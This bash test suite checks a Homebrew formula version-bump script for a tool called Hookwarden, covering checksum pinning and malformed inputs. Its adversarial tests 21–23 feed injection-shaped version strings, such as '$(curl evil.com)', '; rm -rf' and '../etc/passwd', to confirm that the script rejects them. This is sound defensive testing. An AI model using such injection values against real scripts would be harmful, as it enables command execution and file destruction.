#!/usr/bin/env bash
# scripts/release/test-bump-homebrew-edit.sh
# Fixture-driven test for bump-homebrew-edit.sh — the edit core for the
# Hookwarden/homebrew-tap formula. Covers the npm-wrapper-on-macOS shape
# (3 sha256 lines) with happy-path + adversarial inputs.
#
# Style matches scripts/release/test-parity-gate-mutation.sh:
# plain bash + temp dir + per-case isolation + clear FAIL/PASS lines.

set -euo pipefail

cd "$(dirname "$0")/../.."
EDIT=scripts/release/bump-homebrew-edit.sh

SHA_NM=$(printf 'a%.0s' {1..64})  # npm-tarball fixture (macOS path)
SHA_LA=$(printf 'b%.0s' {1..64})  # linux-arm fixture
SHA_LX=$(printf 'c%.0s' {1..64})  # linux-x64 fixture
SHA_WX=$(printf 'd%.0s' {1..64})  # windows-x64 fixture (ignored by bump)
SHA_DA=$(printf 'e%.0s' {1..64})  # darwin-arm fixture (must NOT appear in formula)

mk_formula_v040() {
  # The current formula shape: npm tarball top-level, on_linux/on_arm +
  # on_linux/on_intel binary URLs. macOS gets node-wrapped via on_macos
  # depends_on. 3 sha256 lines total.
  cat > "$1" <<EOF
class Hookwarden < Formula
  desc "Webhook signature-verification audit tool"
  homepage "https://hookwarden.dev"
  url "https://registry.npmjs.org/hookwarden/-/hookwarden-0.4.0.tgz"
  sha256 "0000000000000000000000000000000000000000000000000000000000000000"
  license "Apache-2.0"

  on_macos do
    depends_on "node"
  end

  on_linux do
    on_arm do
      url "https://github.com/Hookwarden/hookwarden/releases/download/v0.4.0/hookwarden-linux-arm64"
      sha256 "1111111111111111111111111111111111111111111111111111111111111111"
    end
    on_intel do
      url "https://github.com/Hookwarden/hookwarden/releases/download/v0.4.0/hookwarden-linux-x64"
      sha256 "2222222222222222222222222222222222222222222222222222222222222222"
    end
  end
end
EOF
}

mk_formula_v030_legacy() {
  # The OLD v0.3.x Linux-only shape (2 sha256 lines, no npm tarball, no on_macos).
  # bump-homebrew-edit.sh MUST fail loudly on this — the python assertion
  # catches it. Regression scaffold: if the formula ever gets reverted to
  # Linux-only without a coupled script downgrade, this test fires.
  cat > "$1" <<EOF
class Hookwarden < Formula
  url "https://github.com/Hookwarden/hookwarden/releases/download/v0.3.0/hookwarden-linux-arm64"
  version "0.3.0"
  sha256 "3333333333333333333333333333333333333333333333333333333333333333"
  depends_on :linux
  on_linux do
    on_intel do
      url "https://github.com/Hookwarden/hookwarden/releases/download/v0.3.0/hookwarden-linux-x64"
      sha256 "4444444444444444444444444444444444444444444444444444444444444444"
    end
  end
end
EOF
}

# ---- Test 1: happy path (3-sha shape, both URL patterns bumped) ----
echo "Test 1: 3-sha formula → npm URL + 2 GH URLs bumped, 3 sha256 lines pinned in source order"
TMP=$(mktemp -d) && trap 'rm -rf "$TMP"' EXIT
cat > "$TMP/checksums.txt" <<EOF
${SHA_LA}  hookwarden-linux-arm64
${SHA_LX}  hookwarden-linux-x64
${SHA_WX}  hookwarden-windows-x64.exe
EOF
mk_formula_v040 "$TMP/hookwarden.rb"
bash "$EDIT" "$TMP/checksums.txt" "$TMP/hookwarden.rb" v0.4.1 "$SHA_NM" > /dev/null

# Both GH URLs should be v0.4.1 now
gh_urls=$(grep -cE 'releases/download/v0\.4\.1/' "$TMP/hookwarden.rb" || true)
if [[ "$gh_urls" != "2" ]]; then
  echo "FAIL: expected 2 v0.4.1 GH URLs, got $gh_urls"
  cat "$TMP/hookwarden.rb"
  exit 1
fi
# npm tarball URL should be 0.4.1.tgz now
if ! grep -q 'hookwarden-0\.4\.1\.tgz' "$TMP/hookwarden.rb"; then
  echo "FAIL: npm tarball URL not bumped to 0.4.1.tgz"
  cat "$TMP/hookwarden.rb"
  exit 1
fi
# 3 sha256 lines must match SHA_NM, SHA_LA, SHA_LX in source order
shas_in_order=$(grep -oE 'sha256 "[a-f0-9]{64}"' "$TMP/hookwarden.rb")
expected_order=$(printf 'sha256 "%s"\nsha256 "%s"\nsha256 "%s"' "$SHA_NM" "$SHA_LA" "$SHA_LX")
if [[ "$shas_in_order" != "$expected_order" ]]; then
  echo "FAIL: sha256 lines not pinned in source order"
  echo "expected:"; echo "$expected_order"
  echo "got:";      echo "$shas_in_order"
  exit 1
fi
# Stale version line must NOT be inserted (the new formula has no version line).
if grep -qE '^\s*version\s+"' "$TMP/hookwarden.rb"; then
  echo "FAIL: stale 'version' line present after bump (current formula auto-derives from npm URL)"
  cat "$TMP/hookwarden.rb"
  exit 1
fi
echo "  PASS"

# ---- Test 2: 5-target checksums (incl darwin extras) → darwin SHAs MUST NOT leak ----
echo "Test 2: 5-target checksums (incl darwin) → script ignores darwin extras, succeeds"
rm -rf "$TMP" && TMP=$(mktemp -d) && trap 'rm -rf "$TMP"' EXIT
cat > "$TMP/checksums.txt" <<EOF
${SHA_DA}  hookwarden-darwin-arm64
${SHA_DA}  hookwarden-darwin-x64
${SHA_LA}  hookwarden-linux-arm64
${SHA_LX}  hookwarden-linux-x64
${SHA_WX}  hookwarden-windows-x64.exe
EOF
mk_formula_v040 "$TMP/hookwarden.rb"
bash "$EDIT" "$TMP/checksums.txt" "$TMP/hookwarden.rb" v0.4.1 "$SHA_NM" > /dev/null
# darwin SHAs MUST NOT appear in formula (macOS uses the npm SHA, not the GH-release one)
if grep -q "$SHA_DA" "$TMP/hookwarden.rb"; then
  echo "FAIL: darwin SHA leaked into formula"
  cat "$TMP/hookwarden.rb"
  exit 1
fi
echo "  PASS"

# ---- Test 3: missing linux-arm64 SHA → exits 1 ----
echo "Test 3: checksums.txt missing hookwarden-linux-arm64 → script MUST fail loudly"
rm -rf "$TMP" && TMP=$(mktemp -d) && trap 'rm -rf "$TMP"' EXIT
cat > "$TMP/checksums.txt" <<EOF
${SHA_LX}  hookwarden-linux-x64
${SHA_WX}  hookwarden-windows-x64.exe
EOF
mk_formula_v040 "$TMP/hookwarden.rb"
if bash "$EDIT" "$TMP/checksums.txt" "$TMP/hookwarden.rb" v0.4.1 "$SHA_NM" 2>/dev/null; then
  echo "FAIL: missing linux-arm64 SHA should have triggered failure"
  exit 1
fi
echo "  PASS (script correctly rejected missing linux-arm64 pin)"

# ---- Test 4: legacy 2-sha formula (old Linux-only shape) → exits 1 ----
echo "Test 4: legacy v0.3.x 2-sha formula → python assertion MUST fail"
rm -rf "$TMP" && TMP=$(mktemp -d) && trap 'rm -rf "$TMP"' EXIT
cat > "$TMP/checksums.txt" <<EOF
${SHA_LA}  hookwarden-linux-arm64
${SHA_LX}  hookwarden-linux-x64
${SHA_WX}  hookwarden-windows-x64.exe
EOF
mk_formula_v030_legacy "$TMP/hookwarden.rb"
if bash "$EDIT" "$TMP/checksums.txt" "$TMP/hookwarden.rb" v0.4.1 "$SHA_NM" 2>/dev/null; then
  echo "FAIL: legacy 2-sha formula should have failed the assertion"
  exit 1
fi
echo "  PASS (script correctly refused to silently regress to Linux-only shape)"

# ---- Test 5: malformed (non-hex) Linux SHA → exits 1 ----
echo "Test 5: malformed (non-hex) Linux SHA → regex validation MUST fail"
rm -rf "$TMP" && TMP=$(mktemp -d) && trap 'rm -rf "$TMP"' EXIT
cat > "$TMP/checksums.txt" <<EOF
NOT-A-VALID-SHA-AT-ALL-NOT-A-VALID-SHA-AT-ALL-NOT-A-VALID-SHA-AT  hookwarden-linux-arm64
${SHA_LX}  hookwarden-linux-x64
EOF
mk_formula_v040 "$TMP/hookwarden.rb"
if bash "$EDIT" "$TMP/checksums.txt" "$TMP/hookwarden.rb" v0.4.1 "$SHA_NM" 2>/dev/null; then
  echo "FAIL: malformed Linux SHA should have failed the [a-f0-9]{64} regex"
  exit 1
fi
echo "  PASS"

# ---- Test 6: malformed npm SHA → exits 1 ----
echo "Test 6: malformed (non-hex) npm SHA arg → regex validation MUST fail"
rm -rf "$TMP" && TMP=$(mktemp -d) && trap 'rm -rf "$TMP"' EXIT
cat > "$TMP/checksums.txt" <<EOF
${SHA_LA}  hookwarden-linux-arm64
${SHA_LX}  hookwarden-linux-x64
EOF
mk_formula_v040 "$TMP/hookwarden.rb"
if bash "$EDIT" "$TMP/checksums.txt" "$TMP/hookwarden.rb" v0.4.1 "not-a-sha" 2>/dev/null; then
  echo "FAIL: malformed npm SHA should have failed the [a-f0-9]{64} regex"
  exit 1
fi
echo "  PASS"

# ---- Test 7: idempotence ----
echo "Test 7: idempotence — running edit twice on the same inputs is a no-op on the second run"
rm -rf "$TMP" && TMP=$(mktemp -d) && trap 'rm -rf "$TMP"' EXIT
cat > "$TMP/checksums.txt" <<EOF
${SHA_LA}  hookwarden-linux-arm64
${SHA_LX}  hookwarden-linux-x64
${SHA_WX}  hookwarden-windows-x64.exe
EOF
mk_formula_v040 "$TMP/hookwarden.rb"
bash "$EDIT" "$TMP/checksums.txt" "$TMP/hookwarden.rb" v0.4.1 "$SHA_NM" > /dev/null
checksum_first=$(shasum "$TMP/hookwarden.rb" | awk '{print $1}')
bash "$EDIT" "$TMP/checksums.txt" "$TMP/hookwarden.rb" v0.4.1 "$SHA_NM" > /dev/null
checksum_second=$(shasum "$TMP/hookwarden.rb" | awk '{print $1}')
if [[ "$checksum_first" != "$checksum_second" ]]; then
  echo "FAIL: second run produced a different formula — not idempotent"
  echo "first:  $checksum_first"
  echo "second: $checksum_second"
  exit 1
fi
echo "  PASS"

# ─── Adversarial + edge-case coverage (Tests 8-20) ──────────────────────────
# Negative tests are the auditor-facing evidence that the bump pipeline can't
# silently corrupt a release. Each case below maps to a real failure mode
# we've either hit (issue #12 release-pipeline bugs) or that a senior DevOps
# would expect a release tool to defend against.

# ---- Test 8: pre-release tag (v1.0.0-rc.1) bumps both URL patterns ----
echo "Test 8: pre-release tag (v1.0.0-rc.1) → sed regex must match both GH + npm URLs"
rm -rf "$TMP" && TMP=$(mktemp -d) && trap 'rm -rf "$TMP"' EXIT
cat > "$TMP/checksums.txt" <<EOF
${SHA_LA}  hookwarden-linux-arm64
${SHA_LX}  hookwarden-linux-x64
EOF
mk_formula_v040 "$TMP/hookwarden.rb"
bash "$EDIT" "$TMP/checksums.txt" "$TMP/hookwarden.rb" v1.0.0-rc.1 "$SHA_NM" > /dev/null
if ! grep -q 'releases/download/v1\.0\.0-rc\.1/' "$TMP/hookwarden.rb"; then
  echo "FAIL: GH URL not bumped to v1.0.0-rc.1"
  cat "$TMP/hookwarden.rb"
  exit 1
fi
if ! grep -q 'hookwarden-1\.0\.0-rc\.1\.tgz' "$TMP/hookwarden.rb"; then
  echo "FAIL: npm tarball URL not bumped to 1.0.0-rc.1.tgz"
  cat "$TMP/hookwarden.rb"
  exit 1
fi
echo "  PASS (pre-release tag handled correctly)"

# ---- Test 9: major version bump (v0.4.0 → v1.0.0) ----
echo "Test 9: major-version bump → both URL patterns + 3 SHAs all updated"
rm -rf "$TMP" && TMP=$(mktemp -d) && trap 'rm -rf "$TMP"' EXIT
cat > "$TMP/checksums.txt" <<EOF
${SHA_LA}  hookwarden-linux-arm64
${SHA_LX}  hookwarden-linux-x64
EOF
mk_formula_v040 "$TMP/hookwarden.rb"
bash "$EDIT" "$TMP/checksums.txt" "$TMP/hookwarden.rb" v1.0.0 "$SHA_NM" > /dev/null
grep -q 'releases/download/v1\.0\.0/' "$TMP/hookwarden.rb" || { echo "FAIL: GH URL not bumped"; exit 1; }
grep -q 'hookwarden-1\.0\.0\.tgz' "$TMP/hookwarden.rb" || { echo "FAIL: npm URL not bumped"; exit 1; }
echo "  PASS"

# ---- Test 10: sequential bumps (v0.4.0 → v0.4.1 → v0.5.0) leave formula
#              in a consistent state at every step ----
echo "Test 10: sequential bumps preserve formula consistency across multiple versions"
rm -rf "$TMP" && TMP=$(mktemp -d) && trap 'rm -rf "$TMP"' EXIT
cat > "$TMP/checksums.txt" <<EOF
${SHA_LA}  hookwarden-linux-arm64
${SHA_LX}  hookwarden-linux-x64
EOF
mk_formula_v040 "$TMP/hookwarden.rb"
SHA_NM_1=$(printf '1%.0s' {1..64})
SHA_NM_2=$(printf '2%.0s' {1..64})
bash "$EDIT" "$TMP/checksums.txt" "$TMP/hookwarden.rb" v0.4.1 "$SHA_NM_1" > /dev/null
bash "$EDIT" "$TMP/checksums.txt" "$TMP/hookwarden.rb" v0.5.0 "$SHA_NM_2" > /dev/null
# Final state should have v0.5.0 everywhere and the v0.5.0 npm SHA
gh_urls=$(grep -cE 'releases/download/v0\.5\.0/' "$TMP/hookwarden.rb" || true)
[[ "$gh_urls" == "2" ]] || { echo "FAIL: expected 2 v0.5.0 GH URLs after sequential, got $gh_urls"; cat "$TMP/hookwarden.rb"; exit 1; }
grep -q "sha256 \"${SHA_NM_2}\"" "$TMP/hookwarden.rb" || { echo "FAIL: latest npm SHA not pinned"; exit 1; }
# No stale v0.4.x URLs anywhere
if grep -qE 'releases/download/v0\.4\.|hookwarden-0\.4\.' "$TMP/hookwarden.rb"; then
  echo "FAIL: stale v0.4.x URL still present after sequential bump"
  cat "$TMP/hookwarden.rb"
  exit 1
fi
echo "  PASS (3-step sequential bump leaves no stale state)"

# ---- Test 11: missing CHECKSUMS file → exits 1 with explicit error ----
echo "Test 11: missing CHECKSUMS file → script MUST fail with a self-describing error"
rm -rf "$TMP" && TMP=$(mktemp -d) && trap 'rm -rf "$TMP"' EXIT
mk_formula_v040 "$TMP/hookwarden.rb"
err_out=$(bash "$EDIT" "$TMP/does-not-exist.txt" "$TMP/hookwarden.rb" v0.4.1 "$SHA_NM" 2>&1) && {
  echo "FAIL: missing CHECKSUMS file should have triggered failure"
  exit 1
} || true
echo "$err_out" | grep -q "CHECKSUMS file does not exist" || {
  echo "FAIL: error message didn't explain the failure clearly"
  echo "got: $err_out"
  exit 1
}
echo "  PASS"

# ---- Test 12: missing FORMULA file → exits 1 with explicit error ----
echo "Test 12: missing FORMULA file → script MUST fail with a self-describing error"
rm -rf "$TMP" && TMP=$(mktemp -d) && trap 'rm -rf "$TMP"' EXIT
cat > "$TMP/checksums.txt" <<EOF
${SHA_LA}  hookwarden-linux-arm64
${SHA_LX}  hookwarden-linux-x64
EOF
err_out=$(bash "$EDIT" "$TMP/checksums.txt" "$TMP/does-not-exist.rb" v0.4.1 "$SHA_NM" 2>&1) && {
  echo "FAIL: missing FORMULA file should have triggered failure"
  exit 1
} || true
echo "$err_out" | grep -q "FORMULA file does not exist" || {
  echo "FAIL: error message didn't explain the failure clearly"
  echo "got: $err_out"
  exit 1
}
echo "  PASS"

# ---- Test 13: empty CHECKSUMS file → exits 1 (no SHAs to pin) ----
echo "Test 13: empty CHECKSUMS → script MUST fail (no Linux SHAs extractable)"
rm -rf "$TMP" && TMP=$(mktemp -d) && trap 'rm -rf "$TMP"' EXIT
: > "$TMP/checksums.txt"
mk_formula_v040 "$TMP/hookwarden.rb"
if bash "$EDIT" "$TMP/checksums.txt" "$TMP/hookwarden.rb" v0.4.1 "$SHA_NM" 2>/dev/null; then
  echo "FAIL: empty CHECKSUMS should have failed the SHA-pinning validation"
  exit 1
fi
echo "  PASS"

# ---- Test 14: CHECKSUMS with DOS line endings (\r\n) → still parses ----
echo "Test 14: CHECKSUMS with DOS line endings → script handles CR-stripping"
rm -rf "$TMP" && TMP=$(mktemp -d) && trap 'rm -rf "$TMP"' EXIT
printf '%s  hookwarden-linux-arm64\r\n%s  hookwarden-linux-x64\r\n' "$SHA_LA" "$SHA_LX" > "$TMP/checksums.txt"
mk_formula_v040 "$TMP/hookwarden.rb"
bash "$EDIT" "$TMP/checksums.txt" "$TMP/hookwarden.rb" v0.4.1 "$SHA_NM" > /dev/null
grep -q "sha256 \"${SHA_LA}\"" "$TMP/hookwarden.rb" || {
  echo "FAIL: DOS line endings in checksums.txt prevented linux-arm SHA pinning"
  cat "$TMP/hookwarden.rb"
  exit 1
}
echo "  PASS"

# ---- Test 15: CHECKSUMS with duplicate filename entries → first match wins ----
echo "Test 15: CHECKSUMS with duplicate hookwarden-linux-arm64 → first match wins"
rm -rf "$TMP" && TMP=$(mktemp -d) && trap 'rm -rf "$TMP"' EXIT
SHA_DUP=$(printf 'd%.0s' {1..64})  # different SHA, second entry
cat > "$TMP/checksums.txt" <<EOF
${SHA_LA}  hookwarden-linux-arm64
${SHA_LX}  hookwarden-linux-x64
${SHA_DUP}  hookwarden-linux-arm64
EOF
mk_formula_v040 "$TMP/hookwarden.rb"
bash "$EDIT" "$TMP/checksums.txt" "$TMP/hookwarden.rb" v0.4.1 "$SHA_NM" > /dev/null
# Must pin the FIRST entry (SHA_LA), not the duplicate
grep -q "sha256 \"${SHA_LA}\"" "$TMP/hookwarden.rb" || { echo "FAIL: first-match-wins violated"; exit 1; }
if grep -q "sha256 \"${SHA_DUP}\"" "$TMP/hookwarden.rb"; then
  echo "FAIL: duplicate (second) entry leaked into formula"
  exit 1
fi
echo "  PASS (first-match-wins semantics preserved)"

# ---- Test 16: uppercase-hex SHA in CHECKSUMS → rejected by validation regex ----
echo "Test 16: uppercase-hex SHA in CHECKSUMS → validation regex MUST reject"
rm -rf "$TMP" && TMP=$(mktemp -d) && trap 'rm -rf "$TMP"' EXIT
SHA_UPPER=$(printf 'A%.0s' {1..64})  # all-uppercase A's
cat > "$TMP/checksums.txt" <<EOF
${SHA_UPPER}  hookwarden-linux-arm64
${SHA_LX}  hookwarden-linux-x64
EOF
mk_formula_v040 "$TMP/hookwarden.rb"
if bash "$EDIT" "$TMP/checksums.txt" "$TMP/hookwarden.rb" v0.4.1 "$SHA_NM" 2>/dev/null; then
  echo "FAIL: uppercase-hex SHA should have failed the [a-f0-9]{64} regex"
  exit 1
fi
echo "  PASS (uppercase-hex correctly rejected — homebrew sha256s are lowercase)"

# ---- Test 17: formula with sha256 inside a Ruby comment → confuses sha count ----
echo "Test 17: formula with sha256 line buried in a comment → assertion MUST fail (ambiguous)"
rm -rf "$TMP" && TMP=$(mktemp -d) && trap 'rm -rf "$TMP"' EXIT
cat > "$TMP/checksums.txt" <<EOF
${SHA_LA}  hookwarden-linux-arm64
${SHA_LX}  hookwarden-linux-x64
EOF
cat > "$TMP/hookwarden.rb" <<EOF
class Hookwarden < Formula
  url "https://registry.npmjs.org/hookwarden/-/hookwarden-0.4.0.tgz"
  sha256 "0000000000000000000000000000000000000000000000000000000000000000"
  # Legacy sha256 "deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef" — DO NOT USE
  on_linux do
    on_arm do
      url "https://github.com/Hookwarden/hookwarden/releases/download/v0.4.0/hookwarden-linux-arm64"
      sha256 "1111111111111111111111111111111111111111111111111111111111111111"
    end
    on_intel do
      url "https://github.com/Hookwarden/hookwarden/releases/download/v0.4.0/hookwarden-linux-x64"
      sha256 "2222222222222222222222222222222222222222222222222222222222222222"
    end
  end
end
EOF
if bash "$EDIT" "$TMP/checksums.txt" "$TMP/hookwarden.rb" v0.4.1 "$SHA_NM" 2>/dev/null; then
  echo "FAIL: formula with sha256-in-comment (4 matches total) should have failed the 3-sha assertion"
  exit 1
fi
echo "  PASS (script correctly refuses to operate on a formula with ambiguous sha256 lines)"

# ---- Test 18: formula with only 1 sha256 line → assertion fails ----
echo "Test 18: corrupted formula with 1 sha256 line → assertion MUST fail"
rm -rf "$TMP" && TMP=$(mktemp -d) && trap 'rm -rf "$TMP"' EXIT
cat > "$TMP/checksums.txt" <<EOF
${SHA_LA}  hookwarden-linux-arm64
${SHA_LX}  hookwarden-linux-x64
EOF
cat > "$TMP/hookwarden.rb" <<EOF
class Hookwarden < Formula
  url "https://registry.npmjs.org/hookwarden/-/hookwarden-0.4.0.tgz"
  sha256 "0000000000000000000000000000000000000000000000000000000000000000"
end
EOF
if bash "$EDIT" "$TMP/checksums.txt" "$TMP/hookwarden.rb" v0.4.1 "$SHA_NM" 2>/dev/null; then
  echo "FAIL: 1-sha formula should have failed the 3-sha assertion"
  exit 1
fi
echo "  PASS"

# ---- Test 19: malformed VERSION arg (no 'v' prefix, garbage) → exits 1 ----
echo "Test 19: malformed VERSION argument → script MUST reject with clear error"
rm -rf "$TMP" && TMP=$(mktemp -d) && trap 'rm -rf "$TMP"' EXIT
cat > "$TMP/checksums.txt" <<EOF
${SHA_LA}  hookwarden-linux-arm64
${SHA_LX}  hookwarden-linux-x64
EOF
mk_formula_v040 "$TMP/hookwarden.rb"
for bad_ver in "0.4.1" "v0.4" "vlatest" "v0.4.1-with spaces" "release-0.4.1"; do
  if bash "$EDIT" "$TMP/checksums.txt" "$TMP/hookwarden.rb" "$bad_ver" "$SHA_NM" 2>/dev/null; then
    echo "FAIL: malformed VERSION '$bad_ver' should have been rejected"
    exit 1
  fi
done
echo "  PASS (5 malformed VERSION variants all correctly rejected)"

# ---- Test 20: identical SHAs across both Linux targets → still works ----
echo "Test 20: same SHA for both Linux targets (edge case: deterministic builds) → succeeds"
rm -rf "$TMP" && TMP=$(mktemp -d) && trap 'rm -rf "$TMP"' EXIT
SHA_SAME=$(printf '7%.0s' {1..64})
cat > "$TMP/checksums.txt" <<EOF
${SHA_SAME}  hookwarden-linux-arm64
${SHA_SAME}  hookwarden-linux-x64
EOF
mk_formula_v040 "$TMP/hookwarden.rb"
bash "$EDIT" "$TMP/checksums.txt" "$TMP/hookwarden.rb" v0.4.1 "$SHA_NM" > /dev/null
# Both Linux blocks must have SHA_SAME (sed/python don't choke on duplicates)
count=$(grep -cE "sha256 \"${SHA_SAME}\"" "$TMP/hookwarden.rb" || true)
[[ "$count" == "2" ]] || { echo "FAIL: expected 2 occurrences of SHA_SAME, got $count"; cat "$TMP/hookwarden.rb"; exit 1; }
echo "  PASS"

# ─── Adversarial / supply-chain hardening (Tests 21-28) ──────────────────────
# These probe the release pipeline for shell-substitution attacks, path
# traversal, and malformed input shapes that a senior DevOps would expect a
# supply-chain-touching script to defend against.

# ---- Test 21: command-injection-shaped VERSION → rejected at validation ----
echo "Test 21: VERSION with command-substitution \$(...) → MUST be rejected (shell-injection guard)"
rm -rf "$TMP" && TMP=$(mktemp -d) && trap 'rm -rf "$TMP"' EXIT
cat > "$TMP/checksums.txt" <<EOF
${SHA_LA}  hookwarden-linux-arm64
${SHA_LX}  hookwarden-linux-x64
EOF
mk_formula_v040 "$TMP/hookwarden.rb"
if bash "$EDIT" "$TMP/checksums.txt" "$TMP/hookwarden.rb" 'v0.4.1$(curl evil.com)' "$SHA_NM" 2>/dev/null; then
  echo "FAIL: VERSION with \$(...) substitution should have been rejected"
  exit 1
fi
echo "  PASS (shell-substitution attack rejected at VERSION regex)"

# ---- Test 22: VERSION with semicolon command separator → rejected ----
echo "Test 22: VERSION with semicolon command separator → MUST be rejected"
rm -rf "$TMP" && TMP=$(mktemp -d) && trap 'rm -rf "$TMP"' EXIT
cat > "$TMP/checksums.txt" <<EOF
${SHA_LA}  hookwarden-linux-arm64
${SHA_LX}  hookwarden-linux-x64
EOF
mk_formula_v040 "$TMP/hookwarden.rb"
if bash "$EDIT" "$TMP/checksums.txt" "$TMP/hookwarden.rb" 'v0.4.1; rm -rf /tmp/xxx' "$SHA_NM" 2>/dev/null; then
  echo "FAIL: VERSION with semicolon-separated command should have been rejected"
  exit 1
fi
echo "  PASS"

# ---- Test 23: VERSION with path traversal → rejected ----
echo "Test 23: VERSION with path-traversal sequence → MUST be rejected"
rm -rf "$TMP" && TMP=$(mktemp -d) && trap 'rm -rf "$TMP"' EXIT
cat > "$TMP/checksums.txt" <<EOF
${SHA_LA}  hookwarden-linux-arm64
${SHA_LX}  hookwarden-linux-x64
EOF
mk_formula_v040 "$TMP/hookwarden.rb"
if bash "$EDIT" "$TMP/checksums.txt" "$TMP/hookwarden.rb" 'v0.4.1/../../../etc/passwd' "$SHA_NM" 2>/dev/null; then
  echo "FAIL: VERSION with path-traversal should have been rejected"
  exit 1
fi
echo "  PASS"

# ---- Test 24: VERSION with leading/trailing whitespace → rejected ----
echo "Test 24: VERSION with leading/trailing whitespace → MUST be rejected"
rm -rf "$TMP" && TMP=$(mktemp -d) && trap 'rm -rf "$TMP"' EXIT
cat > "$TMP/checksums.txt" <<EOF
${SHA_LA}  hookwarden-linux-arm64
${SHA_LX}  hookwarden-linux-x64
EOF
mk_formula_v040 "$TMP/hookwarden.rb"
for bad_ver in " v0.4.1" "v0.4.1 " "v0.4.1\n" $'v0.4.1\t'; do
  if bash "$EDIT" "$TMP/checksums.txt" "$TMP/hookwarden.rb" "$bad_ver" "$SHA_NM" 2>/dev/null; then
    echo "FAIL: VERSION with whitespace '${bad_ver}' should have been rejected"
    exit 1
  fi
done
echo "  PASS (4 whitespace variants all rejected)"

# ---- Test 25: empty VERSION arg → rejected with explicit error ----
echo "Test 25: empty VERSION arg → MUST be rejected at the parameter-default check"
rm -rf "$TMP" && TMP=$(mktemp -d) && trap 'rm -rf "$TMP"' EXIT
cat > "$TMP/checksums.txt" <<EOF
${SHA_LA}  hookwarden-linux-arm64
${SHA_LX}  hookwarden-linux-x64
EOF
mk_formula_v040 "$TMP/hookwarden.rb"
if bash "$EDIT" "$TMP/checksums.txt" "$TMP/hookwarden.rb" '' "$SHA_NM" 2>/dev/null; then
  echo "FAIL: empty VERSION should have been rejected"
  exit 1
fi
echo "  PASS"

# ---- Test 26: BOM-prefixed CHECKSUMS file → parses correctly OR rejects cleanly ----
echo "Test 26: UTF-8 BOM at start of CHECKSUMS → script handles it (parses or rejects, never silently mis-pins)"
rm -rf "$TMP" && TMP=$(mktemp -d) && trap 'rm -rf "$TMP"' EXIT
# Write BOM (EF BB BF) then content
printf '\xEF\xBB\xBF%s  hookwarden-linux-arm64\n%s  hookwarden-linux-x64\n' "$SHA_LA" "$SHA_LX" > "$TMP/checksums.txt"
mk_formula_v040 "$TMP/hookwarden.rb"
set +e
bash "$EDIT" "$TMP/checksums.txt" "$TMP/hookwarden.rb" v0.4.1 "$SHA_NM" 2>/dev/null
code=$?
set -e
# Either rejects (preferred — clear failure mode) OR parses correctly. What it
# MUST NOT do: silently succeed with a BOM-corrupted SHA pinned in the formula.
if [[ "$code" == "0" ]]; then
  # If it parsed: the SHA must be the right 64-hex string with NO BOM bytes.
  if ! grep -q "sha256 \"${SHA_LA}\"" "$TMP/hookwarden.rb"; then
    echo "FAIL: BOM-prefixed CHECKSUMS silently corrupted the pinned SHA"
    cat "$TMP/hookwarden.rb"
    exit 1
  fi
fi
echo "  PASS (BOM handled — either rejected cleanly or parsed without corruption)"

# ---- Test 27: CHECKSUMS missing trailing newline → still parses ----
echo "Test 27: CHECKSUMS file without trailing newline → still parses (POSIX-leniency)"
rm -rf "$TMP" && TMP=$(mktemp -d) && trap 'rm -rf "$TMP"' EXIT
printf '%s  hookwarden-linux-arm64\n%s  hookwarden-linux-x64' "$SHA_LA" "$SHA_LX" > "$TMP/checksums.txt"  # no final \n
mk_formula_v040 "$TMP/hookwarden.rb"
bash "$EDIT" "$TMP/checksums.txt" "$TMP/hookwarden.rb" v0.4.1 "$SHA_NM" > /dev/null
grep -q "sha256 \"${SHA_LA}\"" "$TMP/hookwarden.rb" || { echo "FAIL: arm SHA not pinned"; exit 1; }
grep -q "sha256 \"${SHA_LX}\"" "$TMP/hookwarden.rb" || { echo "FAIL: x64 SHA not pinned"; exit 1; }
echo "  PASS"

# ---- Test 28: 65-char SHA (one too long) → rejected by regex ----
echo "Test 28: 65-char SHA (off-by-one too long) → regex anchor MUST reject"
rm -rf "$TMP" && TMP=$(mktemp -d) && trap 'rm -rf "$TMP"' EXIT
SHA_OVERLONG=$(printf 'a%.0s' {1..65})
cat > "$TMP/checksums.txt" <<EOF
${SHA_OVERLONG}  hookwarden-linux-arm64
${SHA_LX}  hookwarden-linux-x64
EOF
mk_formula_v040 "$TMP/hookwarden.rb"
if bash "$EDIT" "$TMP/checksums.txt" "$TMP/hookwarden.rb" v0.4.1 "$SHA_NM" 2>/dev/null; then
  echo "FAIL: 65-char SHA should have failed the [a-f0-9]{64}\$ regex"
  exit 1
fi
echo "  PASS (off-by-one-too-long mutation caught)"

echo
echo "All 28 bump-homebrew-edit tests passed."
